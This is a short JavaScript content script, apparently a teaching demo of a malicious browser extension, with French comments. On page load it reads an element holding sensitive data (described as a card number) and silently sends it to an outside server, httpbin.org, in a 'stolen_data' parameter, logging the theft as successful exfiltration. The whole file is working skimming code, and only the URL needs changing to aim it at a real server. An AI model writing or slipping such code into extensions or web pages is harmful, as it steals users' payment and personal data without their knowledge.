//attend que la page soit complètement chargée
window.addEventListener('load', () => {
    
    // cherche la balise contenant la donnée sensible
    const secretBox = document.getElementById('secret-data');

    if (secretBox) {
        // extrait le texte (ici numéro de carte)
        const secretText = secretBox.innerText;
        console.log("😈 EXTENSION MALVEILLANTE : J'ai trouvé une donnée sensible ->", secretText);

        // prépare une requête pour envoyer cette donnée vers un serveur externe
        // On utilise httpbin.org qui retourne simplement ce qu'on lui envoie
        const exfiltrationUrl = "https://httpbin.org/get?stolen_data=" + encodeURIComponent(secretText);

        // exécute la fuite de données de manière invisible (fetch)
        fetch(exfiltrationUrl)
            .then(response => {
                console.log("EXTENSION MALVEILLANTE : Donnée exfiltrée avec succès ! (Vérifiez l'onglet Réseau/Network)");
            })
            .catch(error => {
                console.error("EXTENSION MALVEILLANTE : Échec de l'exfiltration.", error);
            });
    }
});